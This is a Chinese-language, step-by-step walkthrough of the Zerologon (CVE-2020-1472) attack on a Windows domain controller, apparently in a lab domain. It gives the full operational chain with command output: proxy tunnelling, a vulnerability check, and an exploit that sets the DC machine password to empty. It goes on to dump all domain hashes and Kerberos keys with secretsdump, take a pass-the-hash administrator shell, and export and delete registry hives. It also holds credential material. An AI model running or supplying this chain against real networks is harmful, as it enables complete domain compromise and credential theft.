cve-2020-1472
# Netlogon使用的AES认证算法中的vi向量默认为0
# 导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，
# 导致可以将域控中保存在AD中的管理员password设置为空

影响版本：
2008 R2   ---   2019
1903内核 --- 2004内核

步骤1  搭建 frp 内网穿透:
获取一台双网卡的主机
#msf 远控 win-2008

搭建 frp 内网穿透
#ubuntu22  frps 服务器端
#win-2008  frpc 客户端端
#kali  proxychains  攻击端


步骤2  域控信息收集:
shell
#进入 win-2008 cmd

#获取域控上的用户
net user /domain
# The request will be processed at a domain controller for domain momoda.com.
# User accounts for \\WIN2012-AD.momoda.com

# -------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
win2012host              
# The command completed with one or more errors.

#定位域控
net time /domain
# Current time at \\WIN2012-AD.momoda.com is 2023/8/2 21:23:22
# The command completed successfully.

#ping 域空主机
ping WIN2012-AD
# Pinging win2012-ad.momoda.com [10.30.30.128] with 32 bytes of data:
# Reply from 10.30.30.128: bytes=32 time<1ms TTL=128
# Reply from 10.30.30.128: bytes=32 time<1ms TTL=128
# Reply from 10.30.30.128: bytes=32 time<1ms TTL=128
# Reply from 10.30.30.128: bytes=32 time<1ms TTL=128

步骤3  检测域控是否存在此漏洞:
proxychains python zerologon_tester.py WIN2012-AD 10.30.30.128
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
# =[proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
# =[proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK

# Success! DC can be fully compromised by a Zerologon attack.
返回 success 表示存在漏洞

步骤4  利用cve-2020-1472漏洞  重置域控账户密码:
proxychains python cve-2020-1472-exploit.py WIN2012-AD 10.30.30.128
# =[proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
# =[proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
# =[proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK

# Target vulnerable, changing account password to empty string

# Result: 0

# Exploit complete!

步骤5  导出域内所有用户凭据 111 (此时域控密码为空，等同于已知密码):
# impacket安装python脚本  secretsdump.py
└─$ proxychains impacket-secretsdump test.local/WIN2012-AD\$@10.30.30.128 -no-pass
导出域控上所有用户 主机 HASH
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:445  ...  OK
# [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41cdc6f5640e8c4df95694926131cb76:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ff62f9496260b280d0f49d328451186d:::
win2012host:1001:aad3b435b51404eeaad3b435b51404ee:e45ef55c895df74cbbf098f4e0f8ea59:::
# WIN2012-AD$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# WIN2008-USER$:1105:aad3b435b51404eeaad3b435b51404ee:4f1b8e32e48a2ea95522484cfe3a7780:::
# WIN7-USER$:1106:aad3b435b51404eeaad3b435b51404ee:4d835c36aa273b07972543c5a0c13019:::
# [*] Kerberos keys grabbed
# krbtgt:aes256-cts-hmac-sha1-96:635ee7da3c3f5d708954f60350d3e37ea086bf0e4857d99eb71334ace3c1fd4f
# krbtgt:aes128-cts-hmac-sha1-96:4c552c25f4d59aa58eeccfdb5eb51344
# krbtgt:des-cbc-md5:7adcf7d92a7943d9
# win2012host:aes256-cts-hmac-sha1-96:dae7ccbba3b04008393717b1491f3d6383e40a06c7cb342ad528092cc45e70df
# win2012host:aes128-cts-hmac-sha1-96:704c1ce49b0a3354b047b10fd3480f76
# win2012host:des-cbc-md5:643d68b93ea191e9
# WIN2012-AD$:aes256-cts-hmac-sha1-96:16add1c56813de0bf5b9c19f63d5f3995e1f39c8419eecaf43097bdcf0c16442
# WIN2012-AD$:aes128-cts-hmac-sha1-96:5697449e4d1ec9053c9917073e96661e
# WIN2012-AD$:des-cbc-md5:45d5f4e638e60d7c
# WIN2008-USER$:aes256-cts-hmac-sha1-96:00b24b1d34bf33c163648345d23d7265a54ef3feef0375950d1ea3ff3a84e4a8
# WIN2008-USER$:aes128-cts-hmac-sha1-96:6f1276e6f579c447534e74654b922574
# WIN2008-USER$:des-cbc-md5:b9b03bce3d61e08c
# WIN7-USER$:aes256-cts-hmac-sha1-96:e835f578f981c698d83299755f14a6f67339d0a94949582a13275ab047140401
# WIN7-USER$:aes128-cts-hmac-sha1-96:c41e6dd702e920cfcf4ed6da6f6ec3d5
# WIN7-USER$:des-cbc-md5:73b57f9220975dce
# [*] Cleaning up... 

步骤5  导出域内 指定 用户凭据 222 (此时域控密码为空，等同于已知密码):
导出域控上  指定  用户 主机 HASH
proxychains impacket-secretsdump test.local/WIN2012-AD\$@10.30.30.128 -no-pass -just-dc | grep 'Administrator'
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:445  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41cdc6f5640e8c4df95694926131cb76:::
                                                                                                                    
proxychains impacket-secretsdump test.local/WIN2012-AD\$@10.30.30.128 -no-pass -just-dc | grep 'win2012host'  
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:445  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
win2012host:1001:aad3b435b51404eeaad3b435b51404ee:e45ef55c895df74cbbf098f4e0f8ea59:::
win2012host:aes256-cts-hmac-sha1-96:dae7ccbba3b04008393717b1491f3d6383e40a06c7cb342ad528092cc45e70df
win2012host:aes128-cts-hmac-sha1-96:704c1ce49b0a3354b047b10fd3480f76
win2012host:des-cbc-md5:643d68b93ea191e9

步骤6  获取域控的本地管理员权限  打开cmd窗口:
#查看 域管理员 分组用户
net group "domain admins" /domain
# The request will be processed at a domain controller for domain momoda.com.
# Group name     Domain Admins
# Comment        ����������Ա
# Members
# -------------------------------------------------------------------------------
Administrator            
# The command completed successfully.

利用HASH 获取 Administrator权限 cmd窗口
proxychains impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:41cdc6f5640e8c4df95694926131cb76 test.local/Administrator@10.30.30.128
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:445  ...  OK
# [*] SMBv3.0 dialect used
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49154  ...  OK
# [!] Launching semi-interactive shell - Careful what you execute
# [!] Press help for extra shell commands
C:\>whoami
momoda\administrator

步骤7 恢复操作1  已经通过wmic拿到域控本地管理员权限时  开始导出sam数据库中原来的计算机hash:
#注册表数据 保存到 磁盘文件
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save

#将磁盘文件 下载到 kali攻击机
#旧版本wmiexec是 get
#新版本wmiexec是 lget
lget system.save
lget sam.save
lget security.save

#删除 磁盘文件
del /f system.save
del /f sam.save
del /f security.save

步骤8 恢复操作2  利用导出的sam数据库 提取出机器账户的明文hex:
proxychains impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL            
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# [proxychains] DLL init: proxychains-ng 4.16
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# [*] Target system bootKey: 0xf0b775a1d6a8bf356cb2655a1fc464f7
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:5553341daca238e499ac422cffe739e5:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# [*] Dumping cached domain logon information (domain/username:hash)
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:5723ee470c95e6916cc80f16f07574d8edc2a6cb6041cbffe4fd9a4714e22c40812a30dd968445115d6d64325df17229587cce2fbc66ae1661679b52a2409dad68a75fcb9e805bc331c45196d6a6671edf9143602d8094c7197a2270f1d205dc8bc2799fed8a86d2557aafdba38e2f87d7951ea97d14d75a7961fe7280031946d79eeaf6bd3a2d85430a46d95896f4070c53bd7c4044566b15c3310eacb5719332f3125564b79d0c0a24722fb36887e84f865328db1702a480a79e57808e8bb5e4e2088ede62a35e185c0bda9e14fa2b596b3393a094bd0430871d7470cef046dfa6dddc7ce26487faa83c323bc442cc
# $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9b6e0f4cdb6c0ead3dac99a251381b0e
# [*] DPAPI_SYSTEM 
# dpapi_machinekey:0xf3738a5a8944f4a981c2563810176ffdb6eb1aa8
# dpapi_userkey:0x54d8f0c95a82fb04382f183bf71470bca4329160
# [*] NL$KM 
#  0000   6C 54 02 11 20 7E 40 B8  06 A6 D6 47 DC F3 AE 66   lT.. ~@....G...f
#  0010   B6 39 19 1E A7 BE C1 67  05 EB 74 46 0E E2 77 53   .9.....g..tF..wS
#  0020   52 E9 FC AA E7 5B 69 A7  CE 28 22 7B 02 90 79 08   R....[i..("{..y.
#  0030   3F 69 26 6D 21 C9 C7 A2  56 DC 72 F1 8A A8 78 55   ?i&m!...V.r...xU
# NL$KM:6c540211207e40b806a6d647dcf3ae66b639191ea7bec16705eb74460ee2775352e9fcaae75b69a7ce28227b029079083f69266d21c9c7a256dc72f18aa87855
# [*] Cleaning up...

步骤9 恢复操作3 利用提取的明文hex 进行最后的恢复操作:
proxychains python restorepassword.py WIN2012-AD@WIN2012-AD -target-ip 10.30.30.128 -hexpass 5723ee470c95e6916cc80f16f07574d8edc2a6cb6041cbffe4fd9a4714e22c40812a30dd968445115d6d64325df17229587cce2fbc66ae1661679b52a2409dad68a75fcb9e805bc331c45196d6a6671edf9143602d8094c7197a2270f1d205dc8bc2799fed8a86d2557aafdba38e2f87d7951ea97d14d75a7961fe7280031946d79eeaf6bd3a2d85430a46d95896f4070c53bd7c4044566b15c3310eacb5719332f3125564b79d0c0a24722fb36887e84f865328db1702a480a79e57808e8bb5e4e2088ede62a35e185c0bda9e14fa2b596b3393a094bd0430871d7470cef046dfa6dddc7ce26487faa83c323bc442cc
# [proxychains] config file found: /etc/proxychains.conf
# [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
# [proxychains] DLL init: proxychains-ng 4.16
# Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:135  ...  OK
# [*] StringBinding ncacn_ip_tcp:10.30.30.128[49157]
# [proxychains] Strict chain  ...  192.168.1.54:7777  ...  10.30.30.128:49157  ...  OK
# Change password OK
密码恢复成功



















